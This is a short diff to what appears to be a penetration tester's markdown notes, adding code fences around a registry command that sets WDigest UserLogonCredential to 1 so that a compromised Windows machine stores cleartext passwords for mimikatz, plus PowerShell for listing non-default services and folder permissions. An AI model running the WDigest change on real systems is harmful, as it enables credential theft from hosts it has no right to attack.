@@ -16,12 +16,14 @@ Lavereging the Steroids-Module for obfuscation
 
 
 # Subverting mimikatz patch (on compromise machine to extract clear text password)
-
+```
 - add HKLM\SYSTEM\CurrentControlSet\Conttol\SecurityProviders\WDigest /v UserLogonCredential /t REG_DWORD /d 1 /f
+```
 
 # Get NON default Services
+```
 $NonDefaultServices = Get-wmiobject win32_service | where { $_.Caption -notmatch "Windows" -and $_.PathName -notmatch "Windows" -and $_.PathName -notmatch "policyhost.exe" -and $_.Name -ne "LSM" -and $_.PathName -notmatch "OSE.EXE" -and $_.PathName -notmatch "OSPPSVC.EXE" -and $_.PathName -notmatch "Microsoft Security Client" }
-
+```
 - $NonDefaultServices.DisplayName # Service Display Name (full name)
 - $NonDefaultServices.PathName # Service Executable
 - $NonDefaultServices.StartMode # Service Startup mode
@@ -32,6 +34,7 @@ $NonDefaultServices = Get-wmiobject win32_service | where { $_.Caption -notmatch
 - $NonDefaultServices.Description # Service Description
 
 # Get Permission
+```
 function Get-Permissions ($folder) {
   (get-acl $folder).access | select `
 		@{Label="Identity";Expression={$_.IdentityReference}}, `
@@ -41,4 +44,4 @@ function Get-Permissions ($folder) {
 		@{Label="Inheritance Flags";Expression={$_.InheritanceFlags}}, `
 		@{Label="Propagation Flags";Expression={$_.PropagationFlags}} | ft -auto
 }
-
+```
